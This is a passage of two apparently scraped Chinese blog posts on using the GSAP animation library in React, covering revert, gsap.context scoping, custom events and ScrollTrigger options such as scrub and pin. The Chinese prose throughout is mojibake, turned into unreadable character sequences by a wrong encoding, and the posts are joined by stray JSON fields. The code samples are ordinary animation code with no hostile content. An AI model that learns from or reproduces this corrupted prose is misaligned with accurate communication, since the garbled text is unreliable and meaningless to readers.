&lt;React.StrictMode&gt; æœ‰å€‹å¾ˆå¸¸è¦‹çš„å•é¡Œï¼Œå°±æ˜¯ useEffect æœƒ render å…©æ¬¡ï¼Œä¾‹å¦‚èªªï¼š 123useEffect(() =&gt; { console.log('effect')}, []) åŸ·è¡Œå¾Œä½ æœƒçœ‹åˆ° effect è¢« log å…©æ¬¡ï¼Œé€™å€‹æ˜¯ React 18 ä»¥å¾Œéƒ½æœƒå‡ºç¾çš„é æœŸè¡Œç‚ºã€‚å¯æ˜¯é€™æ¨£å­æœƒå¼•ç™¼çš„å•é¡Œæ˜¯ã€Œæ¯ä¸€æ¬¡åœ¨ useEffect ä¸­è¨­ç½®çš„å‹•ç•«å…¶å¯¦æœƒè¢«åŸ·è¡Œå…©æ¬¡ã€ï¼Œæ¥è‘—å°±æœƒç”¢ç”Ÿä¸€äº›éˆç•°ç¾è±¡ï¼Œèˆ‰å¹¾å€‹æˆ‘è »å¸¸ç¢°åˆ°çš„ï¼š æ¯æ¬¡ hot reload çš„æ™‚å¾Œå‹•ç•«éƒ½æœƒè®Šå¾—æ€ªæ€ªçš„ åœ¨ä½¿ç”¨ scroll é¡çš„ plugin æ™‚æœƒç›´æ¥è·‘ç‰ˆ etcâ€¦ è€Œè§£æ±ºé€™å€‹å•é¡Œçš„æ–¹æ³•å°±æ˜¯åœ¨ clean functoin ä¸­åšä¸€äº›è™•ç†ã€‚æ‰“å€‹æ¯”æ–¹ä¾†èªªï¼Œå¦‚æœä½ åœ¨ useEffect ä¸­è¨­ç½®äº†åƒ setInterval é€™é¡çš„è¨ˆæ™‚å™¨ï¼Œé‚£ä½ æ‡‰è©²æœƒæƒ³åˆ°è¦åœ¨ clean function ä¸­ç”¨ clearInterval æŠŠé€™å€‹è¨ˆæ•¸å™¨çµ¦æ¸…æ‰ï¼Œå…å¾—åœ¨ä¸€é–‹å§‹çš„æ™‚å€™è¨­å®šåˆ°å…©æ¬¡è¨ˆæ™‚å™¨ï¼Œå°å§ï¼Ÿ æ‰€ä»¥æ¥ä¸‹ä¾†æœƒä»‹ç´¹å¦‚ä½•ç”¨ revert è§£æ±ºåŸ·è¡Œå…©æ¬¡çš„å•é¡Œã€‚ revertå…¶å¯¦å‹•ç•«ä¹Ÿæ˜¯ä¸€æ¨£çš„ï¼Œæ—¢ç„¶å®ƒæœƒè¢« call å…©æ¬¡ï¼Œé‚£æˆ‘å°±è¦åœ¨å®ƒè¢« call ç¬¬äºŒæ¬¡ä»¥å‰æŠŠç¬¬ä¸€æ¬¡çš„å‹•ç•«çµ¦æ¸…é™¤æ‰ï¼Œæ‰€ä»¥æœƒé€™æ¨£å­å¯«ï¼š 12345678910111213useEffect(() =&gt; { const tween = gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) return () =&gt; tween.revert()}, []) revert çš„ä½œç”¨æ˜¯æŠŠå‹•ç•«å–æ¶ˆä¸¦æ¸…é™¤æ‰€æœ‰ gsap åŠ ä¸Šå»çš„ inline styleï¼Œé€™è·Ÿå¦ä¸€å€‹å«åš kill çš„ method æœ‰é»é¡ä¼¼ï¼Œä½†é‚„æ˜¯æœ‰å·®ç•°ï¼Œå°±æ˜¯ kill ä¸¦ä¸æœƒæŠŠ inline-style çµ¦æ¸…é™¤ï¼Œä¸æ‡‚çš„è©±å¯ä»¥åˆ° é€™å€‹ç¯„ä¾‹ åƒè€ƒçœ‹çœ‹ã€‚ contextæ¥è‘—ä¾†ä»‹ç´¹ context çš„ç”¨é€”ï¼Œä¸éåœ¨é‚£ä¹‹å‰å…ˆå›æ†¶ä¸€ä¸‹å‰›å‰›çš„ç¯„ä¾‹ï¼š 12345678910111213useEffect(() =&gt; { const tween = gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) return () =&gt; tween.revert()}, []) æˆ‘å€‘åœ¨å‰é¢æéåœ¨ useEffect ä¸­åŸ·è¡Œå‹•ç•«æ™‚ï¼Œè¦è¨˜å¾—åœ¨ clean function ä¸­ç”¨ revert ä¾†é¿å…å‹•ç•«è¢«åŸ·è¡Œå…©æ¬¡çš„å•é¡Œã€‚å¯æ˜¯å¦ä¸€å€‹å•é¡Œä¾†äº†ï¼š æˆ‘çš„å‹•ç•«å¾ˆå¤šè€¶ï¼Œé›£é“ä¹Ÿå¾—ä¸€å€‹ä¸€å€‹ revert å“¦ï¼Ÿ 1234567891011121314151617useEffect(() =&gt; { const tween1 = gsap.to('.square1', {...}) const tween2 = gsap.to('.square2', {...}) const tween3 = gsap.to('.square3', {...}) const tween4 = gsap.to('.square4', {...}) const tween5 = gsap.to('.square5', {...}) const tween6 = gsap.to('.square6', {...}) return () =&gt; { tween1.revert() tween2.revert() tween3.revert() tween4.revert() tween5.revert() tween6.revert() }}, []) å¦‚æœä¸ä½¿ç”¨ context çš„è©±ç¢ºå¯¦åªèƒ½é€™æ¨£å­åšï¼Œä½†æ˜¯ç”¨äº† context ä»¥å¾Œå¯ä»¥è¼•è¼•é¬†é¬†ç”¨ä¸€è¡Œä¾†æå®šï¼š 1234567891011121314useEffect(() =&gt; { // æŠŠæ‰€æœ‰å‹•ç•«éƒ½åŒ…åœ¨ context è£¡ const ctx = gsap.context(() =&gt; { const tween1 = gsap.to('.square1', {...}) const tween2 = gsap.to('.square2', {...}) const tween3 = gsap.to('.square3', {...}) const tween4 = gsap.to('.square4', {...}) const tween5 = gsap.to('.square5', {...}) const tween6 = gsap.to('.square6', {...}) }) // ä¸€éµé‡ç½® return () =&gt; ctx.revert()}, []) ä¹‹æ‰€ä»¥å¯ä»¥é€™éº¼è¼•é¬†æ˜¯å› ç‚º context çš„æœ¬è³ªæ˜¯ç”¨ä¾†ã€Œè¨˜éŒ„ tween æˆ– timelineã€ï¼Œåªè¦æ˜¯å‡ºç¾åœ¨ context è£¡é¢çš„å‹•ç•«éƒ½æœƒè¢«è¨˜éŒ„ä¸‹ä¾†ï¼Œæ‰€ä»¥ç•¶ä½ å°æ•´å€‹ context åŸ·è¡Œ revert æ™‚ï¼Œå°±å¥½åƒæ˜¯åœ¨èªªã€Œå¹«æˆ‘æŠŠæ‰€æœ‰è¨˜éŒ„çµ¦é‡ç½®ã€çš„æ„Ÿè¦ºï¼Œæ‰€ä»¥æ‰€æœ‰è¨˜éŒ„éƒ½æœƒè¢«é‡ç½®ã€‚ ä½¿ç”¨ context çš„å¥½è™•é‚„æœ‰å¾ˆå¤šï¼Œä½†æˆ‘è¦ºå¾—é€™ç¨® revert çš„åŠŸèƒ½å¯ä»¥ç®—æ˜¯å¯« React çš„èµ·æ‰‹å¼äº†ï¼Œæ‰€ä»¥é€™å€‹åŠŸèƒ½ä¸€å®šè¦å­¸èµ·ä¾†ï¼Œæ¥ä¸‹ä¾†æœƒä»‹ç´¹å¹¾å€‹ context çš„å…¶ä»–åŠŸèƒ½ã€‚ åœ¨ context ä¸­è¨­å®š scopeæ—¢ç„¶æˆ‘å€‘éƒ½å¯« React äº†ï¼Œé‚£å°±ä¸€å®šæœƒæŠŠä¸€äº›æ±è¥¿æŠ½å‡ºå»å¯«æˆã€Œå…ƒä»¶ã€ï¼Œä¾†é”åˆ°é‡è¤‡ä½¿ç”¨çš„ä¾¿åˆ©æ€§ã€‚å¯æ˜¯é€™æ™‚å€™æœƒç¢°åˆ°çš„å¦ä¸€å€‹å•é¡Œæ˜¯ï¼Œå¦‚æœã€Œä¸åŒçš„å…ƒä»¶ä¸­æœ‰ç›¸åŒçš„ class åç¨±æ€éº¼è¾¦ï¼Ÿã€ï¼Œèˆ‰å€‹ä¾‹å­ï¼š 12345678910111213141516171819202122232425function App() { return ( &lt;&gt; &lt;div className='App'&gt; &lt;div className='square'&gt;square1&lt;/div&gt; &lt;B /&gt; &lt;/div&gt; &lt;/&gt; )}function B() { useEffect(() =&gt; { const ctx = gsap.context(() =&gt; { gsap.to('.square', { xPercent: '-50', duration: 2 }) }) return () =&gt; ctx.revert() }, []) return ( &lt;div&gt; &lt;div className='square'&gt;square2&lt;/div&gt; &lt;/div&gt; )} App è£¡é¢æœ‰ä¸€å€‹å­å…ƒä»¶ Bï¼Œè€Œ B è£¡é¢å° .square è¨­ç½®äº†ä¸€å€‹å‹•ç•«ï¼Œé‚£çµæœæœƒæ€éº¼æ¨£ï¼Ÿ é€™æ™‚å€™ä½ å°±æœƒç™¼ç¾ã€Œä¸å°å•Šï¼Œæˆ‘åªæƒ³å° B è£¡é¢çš„ .square è¨­å‹•ç•«è€Œå·²ï¼Œæ€éº¼ä¹Ÿå‹•åˆ° A çš„ .square äº†ã€ã€‚ä¸éä»”ç´°æƒ³æƒ³é€™ä¹ŸæŒºåˆç†çš„ï¼Œç•¢ç«Ÿéƒ½å«åš .square å˜›ï¼Œèª°çŸ¥é“ä½ æŒ‡çš„æ˜¯å“ªä¸€å€‹ .square å‘¢ï¼Ÿ ç¸½è€Œè¨€ä¹‹ï¼Œç‚ºäº†é¿å…é€™ç¨®å•é¡Œæˆ‘å€‘å¯ä»¥åœ¨ context ä¸­å‚³å…¥ä¸€å€‹å€¼ä¾†é™åˆ¶ scopeï¼Œä¾‹å¦‚æŠŠå‰›å‰›çš„ç¯„ä¾‹æ”¹å¯«æˆé€™æ¨£ï¼š 123456789101112131415161718192021222324252627function App() { return ( &lt;&gt; &lt;div className='App'&gt; &lt;div className='square'&gt;square1&lt;/div&gt; &lt;B /&gt; &lt;/div&gt; &lt;/&gt; )}function B() { const component = useRef &lt; HTMLDivElement &gt; null useEffect(() =&gt; { const ctx = gsap.context(() =&gt; { gsap.to('.square', { xPercent: '-50', duration: 2 }) // æŠŠ scope é™åˆ¶åœ¨ B çš„ &lt;div&gt; ä¸­ }, component) return () =&gt; ctx.revert() }, []) return ( &lt;div ref={component}&gt; &lt;div className='square'&gt;square2&lt;/div&gt; &lt;/div&gt; )} åŠ ä¸Š scope ä»¥å¾Œï¼Œå°±ä»£è¡¨åªæœ‰å‡ºç¾åœ¨ B è£¡é¢çš„ .square æ‰æœƒè¢«è¨­ç½®å‹•ç•«ï¼š åœ¨ context ä¸­ä½¿ç”¨äº‹ä»¶æœ‰äº›æ™‚å€™ä½ å¯èƒ½æœƒæƒ³è¦åœ¨é»æ“Šçš„æ™‚å€™æ‰è§¸ç™¼å‹•ç•«ï¼Œé€™æ™‚å€™ä½ å¯ä»¥é€™æ¨£åšï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function App() { const component = useRef(null) const btn = useRef &lt; HTMLButtonElement &gt; null const square = useRef &lt; HTMLDivElement &gt; null useEffect(() =&gt; { const ctx = gsap.context((context) =&gt; { // æ–°å¢ä¸€å€‹ custom eventï¼ˆåå­—è‡ªå·±å–ï¼‰ context.add('onSquareClick', () =&gt; { gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) }) }, component) // è¨­ç½®ç›£è½å™¨ square.current?.addEventListener('click', onTriggerAnimate) btn.current?.addEventListener('click', onRevert) return () =&gt; { ctx.revert() // ç§»é™¤ç›£è½å™¨ï¼ˆé‡è¦!!!ï¼Œè«‹å‹™å¿…è¨˜å¾—ç§»é™¤ï¼Œä¸ç„¶æœƒæœ‰å•é¡Œï¼‰ square.current?.removeEventListener('click', onTriggerAnimate) btn.current?.removeEventListener('click', onRevert) } function onTriggerAnimate() { // é€é ctx å‘¼å« custom event ctx.onSquareClick() } function onRevert() { ctx.revert() } }, []) return ( &lt;&gt; &lt;div ref={component} className='App'&gt; &lt;button className='btn' ref={btn}&gt; Kill the animate &lt;/button&gt; &lt;div className='square one' ref={square}&gt; One &lt;/div&gt; &lt;/div&gt; &lt;/&gt; )} æˆ–è€…ä¹Ÿå¯ä»¥å¯«æˆé€™æ¨£å­ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function App() { const component = useRef(null) const btn = useRef &lt; HTMLButtonElement &gt; null const square = useRef &lt; HTMLDivElement &gt; null useEffect(() =&gt; { // è£¡é¢ä¸æ”¾æ±è¥¿ const ctx = gsap.context(() =&gt; {}, component) // é€é ctx ä¾†æ–°å¢ custom event ctx.add('onSquareClick', () =&gt; { gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) }) // è¨­ç½®ç›£è½å™¨ square.current?.addEventListener('click', onTriggerAnimate) btn.current?.addEventListener('click', onRevert) return () =&gt; { ctx.revert() // ç§»é™¤ç›£è½å™¨ï¼ˆé‡è¦!!!ï¼Œè«‹å‹™å¿…è¨˜å¾—ç§»é™¤ï¼Œä¸ç„¶æœƒæœ‰å•é¡Œï¼‰ square.current?.removeEventListener('click', onTriggerAnimate) btn.current?.removeEventListener('click', onRevert) } function onTriggerAnimate() { ctx.onSquareClick() } function onRevert() { ctx.revert() } }, []) return ( &lt;&gt; &lt;div ref={component} className='App'&gt; &lt;button className='btn' ref={btn}&gt; Kill the animate &lt;/button&gt; &lt;div className='square one' ref={square}&gt; One &lt;/div&gt; &lt;/div&gt; &lt;/&gt; )} æˆ‘æ‡¶çš„è²¼åœ–äº†ï¼Œæ‰€ä»¥ ç¯„ä¾‹ä¸€ã€ç¯„ä¾‹äºŒ å°±ç›´æ¥é™„åœ¨é€™äº†ã€‚ é †ä¾¿è§£é‡‹ä¸€ä¸‹ç‚ºä»€éº¼è¦ç”¨é€™ç¨®æ–¹å¼ä¾†å¯¦ä½œï¼Ÿä½ å¯èƒ½æœƒæƒ³èªªã€Œä¸èƒ½ç›´æ¥æŠŠ event å¯«åœ¨ context ä¸­ä¾†è™•ç†å—ã€ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617useEffect(() =&gt; { const ctx = gsap.context(() =&gt; { square.current?.addEventListener('click', () =&gt; { gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) }) }, component) btn.current?.addEventListener('click', () =&gt; ctx.revert())}, []) é€™å€‹å°±è¦å›æ†¶ä¸€ä¸‹ã€ŒåŒæ­¥ / éåŒæ­¥ã€çš„è§€å¿µäº†ï¼Œä¸éç°¡å–®ä¾†èªª ctx å¾åŸ·è¡Œåˆ°çµæŸæ™‚ï¼Œgsap.to è£¡é¢çš„å…§å®¹å…¶å¯¦æ˜¯ä¸æœƒè¢«è¨˜éŒ„ä¸‹ä¾†çš„ï¼Œå› ç‚ºé‚£å€‹ç•¶ä¸‹æ ¹æœ¬é‚„æ²’è¢«é»æ“Šï¼Œè€Œæ²’è¢«é»æ“Šå°±ä»£è¡¨é‚„æ²’è§¸ç™¼å‹•ç•«ã€‚ æ‰€ä»¥æ¥ä¸‹ä¾†ç•¶ä½ æƒ³é€é ctx.revert() ä¾†é‡ç½®æ™‚ï¼Œå°±æœƒå› ç‚ºæ‰¾ä¸åˆ°è©²ç­†ç´€éŒ„æ‰€ä»¥æ²’è¾¦æ³•æ­£ç¢ºçš„é‡ç½®ï¼Œé€™å°±æ˜¯ç‚ºä»€éº¼ä¸èƒ½é€™æ¨£å¯«çš„åŸå› ã€‚","link":"/2022/11/10/gsap-react-basic/"},{"title":"Gsapï¼ScrollTrigger","text":"å¯«è¦–å·®çš„å¿…èƒŒå·¥å…·ã€‚ åŸºæœ¬è§€å¿µç•¶æˆ‘å€‘å¸Œæœ›å‹•ç•«æ˜¯è—‰ç”±ã€Œæ»¾å‹•ã€ä¾†è§¸ç™¼æ™‚ï¼Œå°±æœƒç”¨åˆ° ScrollTrigger é€™å€‹ Pluginï¼Œä¾†çœ‹ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼š é€™å€‹ç¯„ä¾‹åšçš„äº‹æƒ…æ˜¯ç•¶æˆ‘å€‘æŠŠæ»¾è»¸æ²åˆ°è·é›¢ viewport 30px çš„ä½ç½®æ™‚å°±æœƒè§¸ç™¼å‹•ç•«ï¼ŒåŸå§‹ç¢¼å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import { useEffect } from 'react'function App() { useEffect(() =&gt; { // è¦å…ˆè¨»å†Š pluginï¼Œé€™æ¨£æˆ‘å€‘æ‰èƒ½ç”¨é€™å€‹åŠŸèƒ½ gsap.registerPlugin(ScrollTrigger) gsap.to('.square', { rotationZ: 180, duration: 1, ease: 'none', scrollTrigger: { trigger: '.square', // ç”¨ä¾† trigger é€™å€‹å‹•ç•«çš„å…ƒç´  start: 100 // è·é›¢ viewport ä½ç½® 100px æ™‚è§¸ç™¼å‹•ç•« } }) }, []) return ( &lt;&gt; &lt;div className='section'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/&gt; )}export default App é€™é‚Šæƒ³ç‰¹åˆ¥è¬›çš„æ˜¯ start å€¼çš„è¨­å®šæ–¹å¼ï¼Œé™¤äº†åƒä¸Šé¢é‚£æ¨£ç›´æ¥æŒ‡å®šè·é›¢ viewport å¤šå°‘ px æ™‚è§¸ç™¼ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨ã€Œå­—ä¸²ã€çš„æ–¹å¼ä¾†æŒ‡å®šï¼Œä¾‹å¦‚é€™æ¨£å­ï¼š 1234567891011121314151617181920212223242526272829import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import { useEffect } from 'react'function App() { useEffect(() =&gt; { gsap.registerPlugin(ScrollTrigger) gsap.to('.square', { rotationZ: 180, duration: 1, ease: 'none', scrollTrigger: { trigger: '.square', // ç”¨ä¾† trigger é€™å€‹å‹•ç•«çš„å…ƒç´  start: 'bottom 250px', // ç•¶ .square çš„åº•ç«¯ç¢°åˆ° viewport ä½ç½® 250px æ™‚è§¸ç™¼å‹•ç•« markers: true } }) }, []) return ( &lt;&gt; &lt;div className='section'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/&gt; )}export default App ç¸½ä¹‹ä¸€å®šè¦è¨˜å¾—ï¼š ç¬¬ä¸€å€‹å€¼æ˜¯ç›¸å°æ–¼ trigger çš„é‚£å€‹å…ƒç´ ï¼Œç¬¬äºŒå€‹å€¼æ˜¯ç›¸å°æ–¼ viewport ç¬¬ä¸€å€‹å€¼æ˜¯ç›¸å°æ–¼ trigger çš„é‚£å€‹å…ƒç´ ï¼Œç¬¬äºŒå€‹å€¼æ˜¯ç›¸å°æ–¼ viewport ç¬¬ä¸€å€‹å€¼æ˜¯ç›¸å°æ–¼ trigger çš„é‚£å€‹å…ƒç´ ï¼Œç¬¬äºŒå€‹å€¼æ˜¯ç›¸å°æ–¼ viewport æ‰€ä»¥å¦‚æœæˆ‘è¨­å®š start: 'bottom 100px' çš„è©±ï¼Œæ„æ€å°±æ˜¯ï¼š ç•¶ .square çš„åº•ç«¯ï¼ˆbottomï¼‰ç¢°åˆ° viewport 100px çš„ä½ç½®æ™‚è§¸ç™¼å‹•ç•«ã€‚ Toggle Actionsç°¡å–®ä¾†èªªé€™å€‹åŠŸèƒ½æ˜¯è®“ä½ å¯ä»¥æ±ºå®šç•¶å…ƒç´ é€²å…¥ or é›¢é–‹æ»¾è»¸ç¯„åœæ™‚å¦³æƒ³åšä»€éº¼æ¨£çš„å‹•ä½œï¼ˆActionï¼‰ ç›´æ¥ä¾†çœ‹å€‹ä¾‹å­ï¼š é€™å€‹å‹•ç•«å…¶å¯¦å¾ˆç°¡å–®ï¼Œå°±æ˜¯ç•¶æ»¾è»¸é€²å…¥ç¯„åœæ™‚æŠŠæ–¹å¡Šç”¨æ—‹è½‰åˆ°ä¸­é–“çš„ä½ç½®ï¼Œä¸éç‰¹åˆ¥çš„åœ°æ–¹åœ¨æ–¼æˆ‘å€‘å¤šåŠ äº†ä¸€äº› actionsï¼Œè®“ä»–å¯ä»¥åœ¨é€²å…¥ã€é›¢é–‹æ»¾è»¸ç¯„åœæ™‚åšä¸åŒçš„æ“ä½œï¼š ç•¶ start ç¢°åˆ° scroller-start æ™‚é‡æ–°æ’­æ”¾å‹•ç•«ï¼ˆé€²å…¥ï¼‰ ç•¶ end ç¢°åˆ° scroller-end æ™‚æš«åœå‹•ç•«ï¼ˆé›¢é–‹ï¼‰ ç•¶ end åˆç¢°åˆ° scroler-end æ™‚ç¹¼çºŒæ’­æ”¾å‹•ç•«ï¼ˆé‡æ–°é€²å…¥ï¼‰ ç•¶ start åˆç¢°åˆ° scroller-start æ™‚å€’æ”¾å‹•ç•«ï¼ˆé‡æ–°é›¢é–‹ï¼‰ é€™é‚Šçš„ åŸå§‹ç¢¼ å¦‚ä¸‹ï¼Œæˆ‘è¦ºå¾—çœ‹è¨»è§£æ­é…åœ–ç‰‡å¤§æ¦‚å°±èƒ½æ‡‚æ„æ€äº†ï¼š 123456789101112131415161718192021222324252627282930313233343536import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import { useEffect } from 'react'function App() { useEffect(() =&gt; { gsap.registerPlugin(ScrollTrigger) gsap.to('.square', { rotationZ: 180, duration: 1, position: 'absolute', left: '50%', xPercent: '-50', scrollTrigger: { trigger: '.square', start: 'top 200px', end: 'center 100px', markers: true, // ç”¨é€™å€‹å±¬æ€§ä¾†æ§åˆ¶ action // å¯ä»¥è¨­å®šçš„å€¼ï¼šplay resume reverse restart reset complete none toggleActions: 'restart pause resume reverse' // æ¯å€‹å€¼æœƒå°æ‡‰åˆ°ï¼šonEnter onLeave onEnterBack onLeaveBack } }) }, []) return ( &lt;&gt; &lt;div className='section'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/&gt; )}export default App Scrubç•¶ä½ å¸Œæœ›æŠŠå‹•ç•«çš„æ™‚é–“è»¸å®Œå…¨äº¤çµ¦ã€Œæ»¾è»¸ã€ä¾†æ§åˆ¶æ™‚å°±æœƒç”¨åˆ°é€™å€‹åŠŸèƒ½ã€‚ é¦–å…ˆè·Ÿå‰›å‰›ä¸€æ¨£è¦è¨»å†Šä¸€å€‹æ™‚é–“è»¸ï¼Œä¸åŒçš„æ˜¯ç¾åœ¨è¦å¤šå¡«å…¥ä¸€äº›åƒæ•¸ï¼Œè®“ gsap çŸ¥é“é€™å€‹æ™‚é–“è»¸æ˜¯å¯ä»¥è¢«æ»¾è»¸æ§åˆ¶çš„ï¼š 123456789101112131415161718192021222324252627282930import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import { useEffect } from 'react'function App() { useEffect(() =&gt; { // è¨˜å¾—å…ˆå° gsap è¨»å†Šé¡å¤–çš„ module gsap.registerPlugin(ScrollTrigger) // å»ºç«‹ timeline ä¸¦å¸¶å…¥åƒæ•¸ const timeline = gsap.timeline({ scrollTrigger: { trigger: '.wrapper', // è§¸ç™¼ scrollTrigger çš„é‚£å€‹å…ƒç´  markers: true, // è®“ gsap è‡ªå‹•å¹«ä½ ç•«å‡º start / end æ¨™è¨˜é» start: 'top 200px', // å‹•ç•«é–‹å§‹çš„ä½ç½® end: 'top 10px', // å‹•ç•«çµæŸçš„ä½ç½® scrub: true // æ±ºå®šå‹•ç•«æ’­æ”¾æ˜¯å¦ç”±æ»¾è»¸ä¾†æ§åˆ¶ï¼ˆé‡è¦ï¼ï¼ï¼ï¼‰ } }) }, []) return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; )}export default App è¨­å®šå¥½ä»¥å¾Œæ‡‰è©²æœƒçœ‹åˆ°é€™æ¨£çš„ç•«é¢ï¼š ç°¡å–®ä¾†èªªé€™é‚Šçš„æ„æ€æ˜¯ç•¶ start ç¢°åˆ° scroller-start çš„æ™‚å€™å°±æœƒæ’­æ”¾å‹•ç•«ï¼Œè€Œ end ç¢°åˆ° scroller-end æ™‚å‹•ç•«å°±æœƒçµæŸã€‚è€Œä¸”å› ç‚ºæˆ‘å€‘æœ‰è¨­å®š scrub: trueï¼Œæ‰€ä»¥å‹•ç•«æœƒéš¨è‘—æ»¾è»¸ä¾†æ§åˆ¶æ’­æ”¾çš„æ™‚é–“è»¸ã€‚ æ‰€ä»¥æˆ‘å€‘å¯ä»¥è©¦è‘—åŠ ä¸Šä¸€é»å‹•ç•«ï¼Œåƒé€™æ¨£ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import TextPlugin from 'gsap/TextPlugin'import { useEffect } from 'react'function App() { useEffect(() =&gt; { gsap.registerPlugin(ScrollTrigger, TextPlugin) demo() }, []) function demo() { const timeline = gsap.timeline({ scrollTrigger: { trigger: '.wrapper', markers: true, start: 'top 200px', end: 'top 10px', scrub: true } }) // åŠ ä¸Šå‹•ç•«ï¼ˆç§»å‹•åˆ°ä¸­é–“çš„ä½ç½®ï¼‰ timeline.to('.square1', { position: 'absolute', // è¨˜å¾— .wrapper è¦è¨­ç½®ç‚º relative top: '0', left: '50%', xPercent: '-50' }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; )}export default App é™„è¨»ï¼šæ³¨æ„ start ç¢°åˆ° scroller-start æ™‚å‹•ç•«æ‰é–‹å§‹æ’­æ”¾ï¼Œè€Œ end ç¢°åˆ° scroller-end æ™‚å‹•ç•«æœƒå‰›å¥½çµæŸæ’­æ”¾ã€‚ çœ‹åˆ°é€™é‚Šä»¥å¾Œï¼Œæ‡‰è©²å°±ä¸é›£ç†è§£é€™æ˜¯æ€éº¼é‹ä½œçš„äº†ï¼Œæ‰€ä»¥æ¥è‘—åªè¦å†æŠŠå‹•ç•«çš„éƒ¨åˆ†çµ¦å®Œæˆå°±è¡Œäº†ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import TextPlugin from 'gsap/TextPlugin'import { useEffect } from 'react'function App() { useEffect(() =&gt; { gsap.registerPlugin(ScrollTrigger, TextPlugin) demo() }, []) function demo() { const timeline = gsap.timeline({ scrollTrigger: { trigger: '.wrapper', markers: true, start: 'top 200px', end: 'top 10px', scrub: true } }) timeline // ç§»å‹•åˆ°ä¸­é–“çš„å‹•ç•« .to('.square1', { position: 'absolute', top: '0', left: '50%', xPercent: '-50' }) // ç§»å‹•åˆ°ä¸‹é¢çš„å‹•ç•« .to('.square1', { position: 'absolute', top: '100%', left: '50%', xPercent: '-50', yPercent: '-100' }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; )}export default App æœ€å¾Œå°±é”æˆä¸€é–‹å§‹æƒ³è¦çš„çµæœäº†ï¼š Pinç•¶åˆåœ¨å­¸é€™å€‹å±¬æ€§æ™‚æˆ‘è‡ªå·±è¦ºå¾—å¯¦åœ¨æ²’æœ‰å¾ˆå¥½ç†è§£ï¼Œæ‰€ä»¥å…ˆä¾†çœ‹ä¸€å€‹ç¯„ä¾‹å§ã€‚ é€™æ˜¯æ²’ pin çš„æ™‚å€™ï¼š é€™æ˜¯æœ‰ pin çš„æ™‚å€™ï¼š é™„è¨»ï¼šåŸå§‹ç¢¼å¯ä»¥åˆ°é€™å€‹ ç¯„ä¾‹ åƒè€ƒã€‚ ç°¡å–®ä¾†èªªï¼Œåªè¦è¨­äº† pin: true ä»¥å¾Œï¼Œè—è‰²æ–¹å¡Šå°±æœƒåœ¨ start ç¢°åˆ° scroller-start æ™‚ï¼ŒæŠŠè‡ªå·±ã€Œé‡˜ï¼ˆpinï¼‰ã€åœ¨ scroller-start çš„ä½ç½®ã€‚æ¥è‘—ç­‰åˆ° end ç¢°åˆ° scroller-end æ™‚ï¼Œè—è‰²æ–¹å¡Šæ‰æœƒå–æ¶ˆé‡˜é¸ã€‚ï¼ˆæœ‰é»é¥’å£ï¼Œå»ºè­°å¤šé–±è®€å¹¾æ¬¡ï¼‰ pinSpacingæ¥è‘—å†ä¾†çœ‹å¦å¤–ä¸€å€‹ä¾‹å­ï¼Œè·Ÿå‰›å‰›ä¸åŒçš„æ˜¯ç¾åœ¨å¤šäº†ä¸€å€‹æ–¹å¡Šï¼š é€™å€‹ç¯„ä¾‹æ˜¯æ‹¿æ©˜è‰²æ–¹å¡Šä¾†ç•¶ä½œ scrollTriggerï¼Œè§¸ç™¼æ™‚æœƒæŠŠè—è‰²æ–¹å¡Šçµ¦ pin ä½ä½ï¼Œç›´åˆ° end ç¢°åˆ° scroller-end ç‚ºæ­¢ã€‚ é€™æ®µä¸»è¦çš„åŸå§‹ç¢¼å¤§æ¦‚é•·é€™æ¨£ï¼š 123456789101112useEffect(() =&gt; { const tl = gsap.timeline({ scrollTrigger: { trigger: '.square2', // æ©˜è‰²æ–¹å¡Š start: 'top 80%', end: 'top 50%', markers: true, pin: '.square', // è—è‰²æ–¹å¡Š pinSpacing: false // ä¸‹é¢æœƒè§£é‡‹é€™å€‹çš„ç”¨é€” } })}, []) ä¸éç‚ºä»€éº¼è¦ç‰¹åˆ¥è¬›é€™å€‹å‘¢ï¼Ÿé¦–å…ˆçœ‹äº†ä¸Šé¢çš„åŸå§‹ç¢¼å¾Œæ‡‰è©²æœƒæ³¨æ„åˆ° pinSpacing é€™å€‹å±¬æ€§ï¼Œä»–çš„ç”¨é€”æ˜¯ã€Œè‡ªå‹•æŠŠè¦è¢« pin ä½çš„å…ƒç´ è·Ÿå¾Œé¢çš„å…ƒç´ åŠ 